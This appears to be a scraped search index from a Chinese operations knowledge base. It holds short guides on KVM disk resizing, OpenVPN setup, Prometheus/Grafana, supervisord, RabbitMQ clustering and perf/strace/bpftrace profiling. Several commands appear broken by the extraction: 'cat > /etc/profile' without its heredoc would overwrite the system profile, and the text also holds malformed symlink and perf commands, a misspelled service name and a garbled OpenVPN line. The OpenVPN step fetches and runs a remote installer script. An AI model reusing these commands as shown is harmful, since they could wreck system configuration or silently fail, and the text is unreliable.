蜀ICP备16012425号文件修订时间： 2022-08-15 04:24:55 "},"应用类基操/KVM/kvm迁移esxi.html":{"url":"应用类基操/KVM/kvm迁移esxi.html","title":"kvm迁移esxi","keywords":"","body":"Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-10-10 23:37:31 "},"应用类基操/KVM/在线扩容.html":{"url":"应用类基操/KVM/在线扩容.html","title":"在线扩容","keywords":"","body":"KVM虚拟机开机状态在线调整磁盘 查看block信息，获取到磁盘名。 cdn-logs-download为我的虚拟机名 virsh qemu-monitor-command cdn-logs-download --hmp \"info block\" 直接将磁盘调整到60G， drive-virtio-disk0是上一步中需要扩容的磁盘 virsh qemu-monitor-command cdn-logs-download --hmp \"block_resize drive-virtio-disk0 60G\" 虚拟机里磁盘扩容 curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo curl -o /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo sed -i -e '/mirrors.cloud.aliyuncs.com/d' -e '/mirrors.aliyuncs.com/d' /etc/yum.repos.d/CentOS-Base.repo yum install cloud-utils-growpart.x86_64 -y growpart /dev/vda 2 pvresize /dev/vda2 vgs lvextend -L +50G /dev/mapper/centos-root xfs_growfs /dev/mapper/centos-root Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 04:24:55 "},"应用类基操/OpenVPN部署/":{"url":"应用类基操/OpenVPN部署/","title":"OpenVPN部署","keywords":"","body":"openvpn 一键部署，脚本来源https://github.com/Nyr/openvpn-install Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 04:24:55 "},"应用类基操/OpenVPN部署/OPenVPN部署.html":{"url":"应用类基操/OpenVPN部署/OPenVPN部署.html","title":"OPenVPN部署","keywords":"","body":" 一键安装脚本来源：https://github.com/Nyr/openvpn-install 安装 wget https://git.io/vpn -O openvpn-install.sh && bash openvpn-install.sh 安装选项 Welcome to this OpenVPN road warrior installer! Which IPv4 address should be used? 1) 172.16.2.155 2) 172.18.0.1 3) 172.17.0.1 This server is behind NAT. What is the public IPv4 address or hostname? Which protocol should OpenVPN use? 1) UDP (recommended) 2) TCP What port should OpenVPN listen to? Select a DNS server for the clients: 1) Current system resolvers 2) Google 3) 1.1.1.1 4) OpenDNS 5) Quad9 6) AdGuard Using SSL: openssl OpenSSL 1.0.2k-fips 26 Jan 2017 Using SSL: openssl OpenSSL 1.0.2k-fips 26 Jan 2017 Using SSL: openssl OpenSSL 1.0.2k-fips 26 Jan 2017 An updated CRL has been created. CRL file: /etc/openvpn/server/easy-rsa/pki/crl.pem .............................. Finished! The client configuration is available in: /root/yongxiaodong.ovpn New clients can be added by running this script again. 以上执行完成后就自动启动了openVPN服务，ovpn 客户端配置在/root/目录下，配置文件在/etc/openvpn/目录中 windows客户端安装使用（详细使用方法见11. 远程管理方式） 客户端下载url：https://swupdate.openvpn.org/community/releases/openvpn-install-2.4.8-I602-Win10.exe 下载后安装，并将 服务器上 \"用户.ovpn\" 文件 copy到客户端安装目录中的config目录即可使用（用户.ovpn文件是通过重新执行openvpn-install.sh中新增用户获得） Linux客户端安装使用： yum install epel-release yum install openvpn 将 .ovpn 文件放置/etc/openvpn/connect_aliyun目录中 Linux客户端启动 nohup openvpn /etc/openvpn/connect_aliyun/test_environment.ovpn > /etc/openvpn/connect_aliyun/log.log & openvpn /etc/*.ovpn openvopenvpn /etc/.ovpnpn /etc/.ovpn openvpn /etc/*.ovpn openvpn /etc/*.ovpn 安装完成后的调优 （非必须，根据实际情况调整，以下是我实际应用中整理的优化方案） server.conf 优化 local 172.16.2.155 port 1194 proto udp dev tun ca ca.crt cert server.crt key server.key dh dh.pem auth SHA512 tls-crypt tc.key topology subnet server 10.8.0.0 255.255.255.0 #push \"redirect-gateway def1 bypass-dhcp\" # 此行如果不禁用，客户端所有的流量均会通过openVPN代理，为了提高实际使用体验，禁用此行，并在下面自定义需要通过openVPN走的的路由 ifconfig-pool-persist ipp.txt push \"dhcp-option DNS 100.100.2.136\" # 此处两行表示要客户端vpn拨号后，推送这两个DNS给客户端，根据实际情况配置，也可以使用公共DNS push \"dhcp-option DNS 100.100.2.138\" keepalive 10 120 cipher AES-256-CBC user nobody group nobody persist-key persist-tun status openvpn-status.log verb 3 crl-verify crl.pem explicit-exit-notify # 以下路由是根据我的实际环境中需要通过openVPN经过的流，第一条表示172.16.0.0/16网段流量通过openVPN代理，后面两条是DNS(配置的阿里云的DNS，方便通过阿里云内网域名链接RDS等) push \"route 172.16.0.0 255.255.0.0 vpn_gateway\" push \"route 100.100.2.136 255.255.255.255 vpn_gateway\" push \"route 100.100.2.138 255.255.255.255 vpn_gateway\" client-common.txt优化 client dev tun proto udp remote 47.108.25.212 1194 resolv-retry infinite nobind persist-key persist-tun remote-cert-tls server auth SHA512 cipher AES-256-CBC #ignore-unknown-option block-outside-dns # 经测试如果不禁用这两行，客户端拨号后无法使用DNS解析 #block-outside-dns verb 3 最后 修改完配置文件要重启进程（systemctl restart openvpn-server@server） 在执行安装脚本的时候创建的用户.ovpn配置中会包含gnore-unknown-option block-outside-dns配置，需要手动编辑取消，否则DNS解析无效 删除、新增用户，重新执行安装脚本openvpn-install.sh即可 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 04:24:55 "},"应用类基操/Prometheus+Grafana/":{"url":"应用类基操/Prometheus+Grafana/","title":"Prometheus Grafana","keywords":"","body":"Prometheus+grafana实践 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 04:24:55 "},"应用类基操/Prometheus+Grafana/Grafana.html":{"url":"应用类基操/Prometheus+Grafana/Grafana.html","title":"Grafana","keywords":"","body":" mkdir -p /usr/local/prometheus cd !$ Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 04:24:55 "},"应用类基操/Prometheus+Grafana/Prometheus_grafana.html":{"url":"应用类基操/Prometheus+Grafana/Prometheus_grafana.html","title":"Prometheus Grafana","keywords":"","body":"安装Prometheus mkdir -p /usr/local/prometheus cd !$ wget https://github-production-release-asset-2e65be.s3.amazonaws.com/6838921/88308200-b7b7-11ea-826b-4c99718171b7?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20200701%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20200701T013729Z&X-Amz-Expires=300&X-Amz-Signature=184dd8769f1e3c9d170f1dcc35754e48ee4e6936d106e5cabc17ec75eb63f74a&X-Amz-SignedHeaders=host&actor_id=23717585&repo_id=6838921&response-content-disposition=attachment%3B%20filename%3Dprometheus-2.19.2.linux-amd64.tar.gz&response-content-type=application%2Foctet-stream tar xf prometheus-2.19.2.linux-amd64.tar.gz mv prometheus-2.19.2.linux-amd64 prometheus 安装grafana wget https://dl.grafana.com/oss/release/grafana-7.0.5.linux-amd64.tar.gz mv grafana-7.0.5 grafana Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 04:24:55 "},"应用类基操/Prometheus+Grafana/Supervisior管理进程.html":{"url":"应用类基操/Prometheus+Grafana/Supervisior管理进程.html","title":"Supervisior管理进程","keywords":"","body":"安装 README.md 进程管理 写入supervisord.conf 配置文件（文件为我自己总结的，根据需要修改） cat /etc/supervisord.conf [unix_http_server] file=/var/log/supervisor/supervisor.sock ; the path to the socket file ;chmod=0700 ; socket file mode (default 0700) ;chown=nobody:nogroup ; socket file uid:gid owner ;username=user ; default is no username (open server) ;password=123 ; default is no password (open server) ;[inet_http_server] ; inet (TCP) server disabled by default ;port=127.0.0.1:9001 ; ip_address:port specifier, *:port for all iface ;username=user ; default is no username (open server) ;password=123 ; default is no password (open server) [rpcinterface:supervisor] supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface [supervisord] logfile=/var/log/supervisor/supervisord.log ; main log file; default $CWD/supervisord.log logfile_maxbytes=50MB ; max main logfile bytes b4 rotation; default 50MB logfile_backups=10 ; # of main logfile backups; 0 means none, default 10 loglevel=info ; log level; default info; others: debug,warn,trace pidfile=/var/log/supervisor/supervisord.pid ; supervisord pidfile; default supervisord.pid nodaemon=false ; start in foreground if true; default false silent=false ; no logs to stdout if true; default false minfds=65535 ; min. avail startup file descriptors; default 1024 minprocs=65535 ; min. avail process descriptors;default 200 ;umask=022 ; process file creation umask; default 022 ;user=supervisord ; setuid to this UNIX account at startup; recommended if root ;identifier=supervisor ; supervisord identifier, default is 'supervisor' ;directory=/tmp ; default is not to cd during start ;nocleanup=true ; don't clean up tempfiles at start; default false ;childlogdir=/tmp ; 'AUTO' child log dir, default $TEMP ;environment=KEY=\"value\" ; key value pairs to add to environment ;strip_ansi=false ; strip ansi escape codes in logs; def. false [supervisorctl] serverurl=unix:///var/log/supervisor/supervisor.sock ; use a unix:// URL for a unix socket ;serverurl=http://127.0.0.1:9001 ; use an http:// url to specify an inet socket ;username=chris ; should be same as in [*_http_server] if set ;password=123 ; should be same as in [*_http_server] if set ;prompt=mysupervisor ; cmd line prompt (default \"supervisor\") ;history_file=~/.sc_history ; use readline history if available ;[program:theprogramname] ;command=/bin/cat ; the program (relative uses PATH, can take args) ;process_name=%(program_name)s ; process_name expr (default %(program_name)s) ;numprocs=1 ; number of processes copies to start (def 1) ;directory=/tmp ; directory to cwd to before exec (def no cwd) ;umask=022 ; umask for process (default None) ;priority=999 ; the relative start priority (default 999) ;autostart=true ; start at supervisord start (default: true) ;startsecs=1 ; # of secs prog must stay up to be running (def. 1) ;startretries=3 ; max # of serial start failures when starting (default 3) ;autorestart=unexpected ; when to restart if exited after running (def: unexpected) ;exitcodes=0 ; 'expected' exit codes used with autorestart (default 0) ;stopsignal=QUIT ; signal used to kill process (default TERM) ;stopwaitsecs=10 ; max num secs to wait b4 SIGKILL (default 10) ;stopasgroup=false ; send stop signal to the UNIX process group (default false) ;killasgroup=false ; SIGKILL the UNIX process group (def false) ;user=chrism ; setuid to this UNIX account to run the program ;redirect_stderr=true ; redirect proc stderr to stdout (default false) ;stdout_logfile=/a/path ; stdout log path, NONE for none; default AUTO ;stdout_logfile_maxbytes=1MB ; max # logfile bytes b4 rotation (default 50MB) ;stdout_logfile_backups=10 ; # of stdout logfile backups (0 means none, default 10) ;stdout_capture_maxbytes=1MB ; number of bytes in 'capturemode' (default 0) ;stdout_events_enabled=false ; emit events on stdout writes (default false) ;stdout_syslog=false ; send stdout to syslog with process name (default false) ;stderr_logfile=/a/path ; stderr log path, NONE for none; default AUTO ;stderr_logfile_maxbytes=1MB ; max # logfile bytes b4 rotation (default 50MB) ;stderr_logfile_backups=10 ; # of stderr logfile backups (0 means none, default 10) ;stderr_capture_maxbytes=1MB ; number of bytes in 'capturemode' (default 0) ;stderr_events_enabled=false ; emit events on stderr writes (default false) ;stderr_syslog=false ; send stderr to syslog with process name (default false) ;environment=A=\"1\",B=\"2\" ; process environment additions (def no adds) ;serverurl=AUTO ; override serverurl computation (childutils) ; The sample eventlistener section below shows all possible eventlistener ; subsection values. Create one or more 'real' eventlistener: sections to be ; able to handle event notifications sent by supervisord. ;[eventlistener:theeventlistenername] ;command=/bin/eventlistener ; the program (relative uses PATH, can take args) ;process_name=%(program_name)s ; process_name expr (default %(program_name)s) ;numprocs=1 ; number of processes copies to start (def 1) ;events=EVENT ; event notif. types to subscribe to (req'd) ;buffer_size=10 ; event buffer queue size (default 10) ;directory=/tmp ; directory to cwd to before exec (def no cwd) ;umask=022 ; umask for process (default None) ;priority=-1 ; the relative start priority (default -1) ;autostart=true ; start at supervisord start (default: true) ;startsecs=1 ; # of secs prog must stay up to be running (def. 1) ;startretries=3 ; max # of serial start failures when starting (default 3) ;autorestart=unexpected ; autorestart if exited after running (def: unexpected) ;exitcodes=0 ; 'expected' exit codes used with autorestart (default 0) ;stopsignal=QUIT ; signal used to kill process (default TERM) ;stopwaitsecs=10 ; max num secs to wait b4 SIGKILL (default 10) ;stopasgroup=false ; send stop signal to the UNIX process group (default false) ;killasgroup=false ; SIGKILL the UNIX process group (def false) ;user=chrism ; setuid to this UNIX account to run the program ;redirect_stderr=false ; redirect_stderr=true is not allowed for eventlisteners ;stdout_logfile=/a/path ; stdout log path, NONE for none; default AUTO ;stdout_logfile_maxbytes=1MB ; max # logfile bytes b4 rotation (default 50MB) ;stdout_logfile_backups=10 ; # of stdout logfile backups (0 means none, default 10) ;stdout_events_enabled=false ; emit events on stdout writes (default false) ;stdout_syslog=false ; send stdout to syslog with process name (default false) ;stderr_logfile=/a/path ; stderr log path, NONE for none; default AUTO ;stderr_logfile_maxbytes=1MB ; max # logfile bytes b4 rotation (default 50MB) ;stderr_logfile_backups=10 ; # of stderr logfile backups (0 means none, default 10) ;stderr_events_enabled=false ; emit events on stderr writes (default false) ;stderr_syslog=false ; send stderr to syslog with process name (default false) ;environment=A=\"1\",B=\"2\" ; process environment additions ;serverurl=AUTO ; override serverurl computation (childutils) ; The sample group section below shows all possible group values. Create one ; or more 'real' group: sections to create \"heterogeneous\" process groups. ;[group:thegroupname] ;programs=progname1,progname2 ; each refers to 'x' in [program:x] definitions ;priority=999 ; the relative start priority (default 999) ; The [include] section can just contain the \"files\" setting. This ; setting can list multiple files (separated by whitespace or ; newlines). It can also contain wildcards. The filenames are ; interpreted as relative to this file. Included files *cannot* ; include files themselves. [include] files = supervisord.d/*.conf EOF 服务进程管理 cat /etc/supervisord.d/kibana.conf [program:kibana] directory = /usr/local/elk/kibana-7.7.1/bin ; 程序的启动目录 command = sh kibana ; 启动命令，与命令行启动的命令是一样的 autostart = true ; 在 supervisord 启动的时候也自动启动 startsecs = 5 ; 启动 5 秒后没有异常退出，就当作已经正常启动了 autorestart = true ; 程序异常退出后自动重启 startretries = 3 ; 启动失败自动重试次数，默认是 3 user = elastic ; 用哪个用户启动 redirect_stderr = true ; 把 stderr 重定向到 stdout，默认 false stdout_logfile_maxbytes = 20MB ; stdout 日志文件大小，默认 50MB stdout_logfile_backups = 10 ; stdout 日志文件备份数 ; stdout 日志文件，需要注意当指定目录不存在时无法正常启动，所以需要手动创建目录（supervisord 会自动创建日志文件） stdout_logfile = /var/log/kibana.log ;日志统一放在log目录下 EOF 常用操作 启动 supervisord -c /etc/supervisord.conf 修改了配置文件重载 supervisorctl update supervisorctl stop programxxx，停止某一个进程(programxxx)，programxxx 为 [program:beepkg] 里配置的值，这个示例就是 beepkg。 supervisorctl start programxxx，启动某个进程。 supervisorctl restart programxxx，重启某个进程。 supervisorctl status，查看进程状态。 supervisorctl stop groupworker ，重启所有属于名为 groupworker 这个分组的进程(start,restart 同理)。 supervisorctl stop all，停止全部进程，注：start、restart、stop 都不会载入最新的配置文件。 supervisorctl reload，载入最新的配置文件，停止原有进程并按新的配置启动、管理所有进程。 supervisorctl update，根据最新的配置文件，启动新配置或有改动的进程，配置没有改动的进程不会受影响而重启。 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 04:24:55 "},"应用类基操/RabbitMQ/":{"url":"应用类基操/RabbitMQ/","title":"Rabbit MQ","keywords":"","body":"erlang 版本：Erlang/OTP 23 RabbitMQ 版本：RabbitMQ version: 3.8.4 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 04:24:55 "},"应用类基操/RabbitMQ/1.erlang部署.html":{"url":"应用类基操/RabbitMQ/1.erlang部署.html","title":"1.erlang部署","keywords":"","body":"简介 RabbitMQ 由erlang语言开发，所以需要先安装erlang环境才能运行 Centos7 安装erlang 1、依赖安装 yum -y install make gcc gcc-c++ kernel-devel m4 ncurses-devel openssl-devel unixODBC-devel libtool libtool-ltdl-devel 2、 下载并解压 wget http://erlang.org/download/otp_src_23.0.tar.gz tar xf otp_src_23.0.tar.gz && cd otp_src_23.0/ ./configure --prefix=/usr/local/erlang make -j 2 make install 3、配置环境变量 cat > /etc/profile # erlang export ERLANG_HOME=/usr/local/erlang export PATH=$PATH:$ERLANG_HOME/bin EOF 4、 验证是否安装成功 source /etc/profile [root@cs1 elk]# erl # 能进入以下界面表示erlang环境成功 Erlang/OTP 23 [erts-11.0] [source] [64-bit] [smp:4:4] [ds:4:4:10] [async-threads:1] [hipe] Eshell V11.0 (abort with ^G) 1> Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 04:24:55 "},"应用类基操/RabbitMQ/2.RabbitMQ部署.html":{"url":"应用类基操/RabbitMQ/2.RabbitMQ部署.html","title":"2.RabbitMQ部署","keywords":"","body":"安装 1、下载解压 wget http://192.168.1.22:8090/download/attachments/2557088/rabbitmq-server-generic-unix-3.8.4.tar.xz?version=1&modificationDate=1590979700000&api=v2&download=true tar xf rabbitmq-server-generic-unix-3.8.4.tar.xz -C /usr/local/rabbitmq/ 2、配置环境变量 cat > /etc/profile # rabbit mq export PATH=$PATH:/usr/local/rabbitmq/sbin EOF source /etc/profile 启动 rabbitmq-server -detached #后台启动，监听5672端口 附加：常用操作 1、启动rabbitmq rabbitmq-server -detached #后台启动 2、查看服务状态 rabbitmqctl status 3、 停止RabbitMQ rabbitmqctl stop 4、列出/启动插件 列出插件 rabbitmq-plugins list 启用插件 rabbitmq-plugins enable rabbitmq_management 默认端口15672，对外访问即：IP:15672，默认的账号密码是guest，但是该账号只能通过localhost登录 1）添加用户 rabbitmqctl add_user [username] [password] 2）添加权限 rabbitmqctl set_permissions -p \"/\" [username] \".*\" \".*\" \".*\" # \"/\"即vhost 3）修改用户角色 rabbitmqctl set_user_tags [username] administrator 4）修改用户密码 rabbitmqctl change_password [username] [password] 4）查看当前用户列表 rabbitmqctl list_users 5）删除用户 rabbitmqctl delete_user [username] MQ自启动 1、首先需要确保将你的erl 链接到/usr/bin/erl，需要执行 ln -s ${which erl} /usr/bin/erl 2、假设你是在Centos7中采用源码方式安装的RabbitMQ，且安装目录为/usr/local/rabbitmq，你需要执行（注意：以下服务中的user和Group非常重要，不能删除） cat > /usr/lib/systemd/system/rabbitmq-server.service [Unit] Description=RabbitMQ broker After=syslog.target network.target [Service] Type=notify User=root Group=root WorkingDirectory=/usr/local/rabbitmq ExecStart=/usr/local/rabbitmq/sbin/rabbitmq-server ExecStop=/usr/local/rabbitmq/sbin/rabbitmqctl stop [Install] WantedBy=multi-user.target EOF systemctl enable rabbitmq-serve 3、尝试重启服务器验证mq是否正常启动 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 04:24:55 "},"应用类基操/RabbitMQ/RabbitMq镜像集群部署.html":{"url":"应用类基操/RabbitMQ/RabbitMq镜像集群部署.html","title":"RabbitMq镜像集群部署","keywords":"","body":"准备工作 注意：本篇文章只在集群中添加了2个节点，一般集群为了防止脑裂发生，节点数量会采用基数，比如3个节点 1、确保RabbitMQ机器之间可以通过主机名解析，添加hosts解析 普通集群搭建 1、将主节点(node1)的.erlang.cookie 文件复制到各个节点上，保证 /root/.erlang.cookie文件一致 2、在node2上执行命令 加入到node1的集群 确保可以通过node-1解析到主节点 rabbitmq-server -detached rabbitmqctl stop_app rabbitmqctl join_cluster --ram rabbit@node-1 rabbitmqctl start_app 3、查看集群状态 rabbitmqctl cluster_status 注意看以下命令输出结果中的Running Nodes是否显示了已加入集群的节点 至此，普通集群创建完成 镜像集群创建 1、在任意节点执行命令创建同步策略 rabbitmqctl set_policy ha-all \"^.*\" '{\"ha-mode\":\"all\"}' 参数解释： ha-all为策略名称。 ^为匹配符，只有一个^代表匹配所有，^zlh为匹配名称为zlh的 exchanges 或者 queue。 ha-mode为匹配类型，分为 3 种模式： all所有（所有的queue） exctly部分（需配置ha-params参数，此参数为int类型比如3，众多集群中的随机3台机器） nodes指定（需配置ha-params参数，此参数为数组类型比如[\"rabbit@node-1\",\"rabbit@node-2\",,\"rabbit@node-3\"]这样指定为3台机器。） 2、查看策略 rabbitmqctl list_policies 3、 附加：WEb页面创建 or 查看策略 登录web页面--> Admin--> policies 可以查看和添加策略 负载均衡（详细操作方法此处不累述LB常识） 1、可以使用阿里云SLB，调度5672端口即可 2、可以使用Haproxy+keepalived，调度5672端口即可 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 04:24:55 "},"系统性能/":{"url":"系统性能/","title":"系统性能","keywords":"","body":" Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-06-23 23:39:04 "},"系统性能/1、分析工具.html":{"url":"系统性能/1、分析工具.html","title":"1、分析工具","keywords":"","body":" perf CPU剖析、系统调用跟踪offcputime 用调用度 跟踪做off-cpu剖析strace 系统调用跟踪execsnoop 新进程跟踪syscoun 系统调用统计bpftrace 信号跟踪、IO、锁分析和其它 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-02-07 05:06:14 "},"系统性能/2、perf剖析器.html":{"url":"系统性能/2、perf剖析器.html","title":"2、perf剖析器","keywords":"","body":"火焰图 yum install perf 采样 使用perf在所有(-a)CPU上以49Hz（-F 49: 每秒采样数） 对栈(-g)跟踪，采样30秒perf record -F 49 -a -g -- sleep 5 建议使用49Hz或者99Hz作为采样频率，避免和某些以100Hz发生的事件合拍，这样可以提高采样的精准度也可以使用-p选项跟踪单个进程： perf record -F 49 -g -p ${PID}启动进程的时候并跟踪: perf record -F 999 ./test 生成火焰图 下面示例采样5秒，然后生成火焰图(out.svg) perf record -F 49 -a -g -- sleep 5; perf script --header > out.stacks git clone https://github.com/brendangregg/FlameGraph.git; cd FlameGraph ./stackcollapse-perf.pl out.svg Linux 5.8中加入了火焰图报告功能，将上面的原始火焰图软件组合成了一个命令 perf scipt report flamegraph 查看剖析报告 perf report 报告生成来自于源文件perf.data，可以在生成火焰图前使用report查看 了解更多： Perf零侵入应用性能瓶颈分析 调用跟踪 跟踪Mysqld进程的系统调用 perf trace -p $(pgrep mysqld) 系统调用内核时间分析, 捕捉3秒 perf trace -s -p $(pgrep mysqld) -- sleep 3 该输出显示了每个线程系统调用的技术和时间，直接trace进程时，在任何繁忙的应用程序上都会产生大量的输出，-s汇总参数能帮助我们先从汇总信息开始 IO剖析 perf trace -e sendto -p $(pgrep mysqld) Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-03-10 00:40:15 "},"系统性能/3.strace.html":{"url":"系统性能/3.strace.html","title":"3.strace","keywords":"","body":"strace名是Linux中系统调用的跟踪器，为每个系统调用答应一行摘要，还可以统计系统调用并打印报告 跟踪PID为1884的系统调用 strace -ttt -T -p 1884 -ttt 第一列打印为unix时间戳 -T 打印最后一个字段time，该字段表示系统调用的持续时间 -p PID 需要跟踪进程的ID，也可以执行为命令，这样strace就会启动并跟踪它 跟踪可能会造成过多的性能开销 strace采用了基于断点的耿总，这为所有的系统调用的进入和返回都设置了断点，这是一种侵入式的做法，系统调用率高的应用程序可能会发现性能下降了一个数量级 为了证明这一点，使用strace dd命令时带来了数十倍的性能差距，例:strace -c dd if=/dev/zero of=/dev/null bs=1k count=50k time： 显示系统CPU时间话费的百分比 second： 总的系统CPU时间，以秒为单位 usecs/call： 每次调用的平均系统CPU时间，单位是微妙 calls： 系统调用的数量 syscall： 系统调用的名称 取消strace跟踪，直接使用dd命令 dd if=/dev/zero of=/dev/null bs=1k count=50k Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-02-07 05:06:14 "},"系统性能/4.execsnoop.html":{"url":"系统性能/4.execsnoop.html","title":"4.execsnoop","keywords":"","body":"execsnoop 是一个bcc的bpftrace工具，它可以耿总系统级别的新进程执行，可以发现消耗CPU资源的短命进程问题 git clone https://github.com/brendangregg/perf-tools.git --depth 1 ./perf-tools/execsnoop syscount 是系统级别的统计系统调用的BCC和bpftrace工具 ./perf-tools/execsnoop Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-02-07 05:06:14 "},"系统性能/bpftrace.html":{"url":"系统性能/bpftrace.html","title":"Bpftrace","keywords":"","body":"bpftrace是一个基于BPF的跟踪器，它提供了一种高级编程语言(类似与awk命令)，可以创建强大的单行命令和短脚本 Centos7 install curl https://repos.baslab.org/rhel/7/bpftools/bpftools.repo --output /etc/yum.repos.d/bpftools.repo yum install bpftrace bpftrace-tools bpftrace-doc bcc-static bcc-tools 跟踪新进程并查看参数bpftrace -e 'tracepoint:syscalls:sys_enter_execve {join(args->argv);}' 按进程统计系统调用的次数 bpftrace -e 'tracepoint:syscalls:sys_enter_* { @[probe] = count();} Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-02-07 05:06:14 "},"系统性能/Buffer和Cache.html":{"url":"系统性能/Buffer和Cache.html","title":"Buffer和Cache","keywords":"","body":"Buffer 词义： 缓冲区 比如需要对磁盘进行10次写入，前9次写入都暂且被存在内存中，直到第10次写入时。才将这10次写入的数据一次性写入到磁盘，以此来减少IO的操作次数，有消峰的效果 Cache 词义： 缓存区 假设我们需要从一块4K对齐的磁盘中读取9KB的文件数据，最终就会读取到磁盘的3个扇区（因为一个扇区是4K，所以9K数据会有3个扇区）到内存中，存放这3个扇区数据的内存空间，就是buffer，CPU可以直接操作这一组Buffer，操作完成后，Buffer会被释放 如果应用需要重复的读取这个9KB的文件，每次都要从磁盘读取显然很慢，如果第一次读取后，没有直接清空buffer，而是把这段内存保存下来或者复制，以后读取这个文件就可以直接从内存读取，这就是Cache,严谨来说，上述这种属于ReadCache 既然有ReadCache，那就有WriteCache。假设应用对刚刚读取的4个扇区数据，在内存中修改了第一个扇区的数据，然后又修改了第二个扇区的数据，紧接着又修改了第三个扇区的数据。这3次修改被合并为了一次IO操作并写入磁盘，这就是WriteCache，也是Buffer的一种形式 区别总结 Buffer除了作为临时存放IO数据的作用外，还可以消峰，而Cache是为了提高性能而生 Buffer中的数据不能被清除，一旦被清除可能意味着IO Error； Cache可以被清除，只是清除后需要重新从磁盘寻找数据 由于CPU不能直接操作内存，所以每次IO一定会产生buffer，而不一定产生Cache，是否产生Cache取决于特定的算法Cache又分为ReadCache和WriteCache，比如在WriteCache时，又属于是buffer的一种形式。所以Buffer和Cache常常一起出现。很多时候Write Cache同时也可以作为Read Cache使用，但在分布式系统中，则需要考虑Cache一致性的问题 Buffer和Cache非常相似，它们都存储数据。特定场合它们也有区别，Buffer的主要目的是在不同应用、线程、进程之间共享字节数据，例如为了让不同速度的设备能够进行数据同步，就会使用共享 Buffer； Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-09-28 03:14:34 "},"系统性能/CPU.html":{"url":"系统性能/CPU.html","title":"CPU","keywords":"","body":"术语 处理器： 物理芯片，以核或者硬件线程的方式包含了多个CPU核: 一个多核处理器上的独立CPU实例硬件线程： 一个钟支持在一个核上同时执行多个线程的CPU架构，每个线程是一个独立的CPU实例CPU指令： CPU操作来源于它的指令集，指令用于算数操作、内存/IO和逻辑控制逻辑CPU：又称虚拟CPU，处理可以通过硬件线程实现调度器： 把CPU分配给线程运行的内核子系统运行队列： 等待CPU服务的可运行线程队列 CPU内存缓存 为了提供内存I/O性能，处理器提供了多种硬件缓存，如 CPU寄存器->一级缓存->二级缓存->三级缓存->主存->存储设备->云存储 越左侧的缓存大小越小，速度越快，越靠近CPU 多处理器系统，内核通常为每个CPU都提供一个运行队列，并尽量使现场每次都被放到同一个队列中，这以为这现场更优可能运行在同一个CPU上， 因为CPU缓存了保存了它们的数据，这些数据被称为热度缓存，这种保持线程运行在相同CPU上的方法被称为CPU亲和性，提高了内存本地性 性能问题故障分析 通用准入性能分析60秒 黄金60秒尝试定位性能异常组件 uptime： 识别1分钟、5分钟、15分钟平均值负载 top ： 检查概览 vmstat -SM 1 : 查看运行队列长度、交换和CPU整体使用情况 mpstat -P ALL 1: 查看CPU核心平衡情况,检查单个热点CPU，发现可能的线程扩展性问题 dmesg -T | tail: 查看内核日志，可能包含一些OOM错误 pidstat 1 : 查看每个进程的CPU使用情况 free -m: 查看内存使用情况，包括文件系统缓存 iostat -x 1: 磁盘IO统计，IOPS、吞吐量、平均等待时间和忙碌百分比 sar -n DEV 1 : 网络设置IO、数据包和吞吐量 sar -n TCP,ETCP 1 ： TCP统计，连接率和重传 初步定位CPU开销 定位顺序如下 了解整个系统当前使用率是多少，每个CPU是多少 了解当前队列情况 用户与内核时间比 哪个应用或者用户使用CPU最多，用了多少 遇到了什么类型的停滞周期（比如IO还是内存） 为什么CPU被使用（用户和内核级别的调用路径，perf可以分析） 错误 系统调用频率 资源上下文切换频率 中断频率 cat /proc/softirqs 中断的CPU用量是多少 零侵入CPU剖析 Perf 分析一个正在运行的程序 1.获得在运行的进程PID 2.开始采样perf record -F 49 -g -p 根据采样数据分析性能热点perf report 图中可以看出88%的性能开销来自main.Fun3函数，10%的性能损耗来自Main.fun1函数输出结果： Overhead：指出了该Symbol采样在总采样中所占的百分比。在当前场景下，表示了该Symbol消耗的CPU时间占总CPU时间的百分比 Command：进程名 Shared Object：模块名， 比如具体哪个共享库，哪个可执行程序。 Symbol：二进制模块中的符号名，如果是高级语言，比如C语言编写的程序，等价于函数名。 火焰图 git clone https://github.com/brendangregg/FlameGraph.git && cd FlameGraph 1.用perf script工具对perf.data进行解析 `perf script -i perf.data &> perf.unfold` 2.将perf.unfold中的符号进行折叠 `./stackcollapse-perf.pl perf.unfold &> perf.folded` 3.最后生成svg图： `./flamegraph.pl perf.folded > perf.svg` Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-02-16 02:27:58 "},"系统性能/epoll.html":{"url":"系统性能/epoll.html","title":"Epoll","keywords":"","body":" 阻塞：等待IO的时候休眠,不进行CPU调度，不占用CPU 非阻塞轮询： 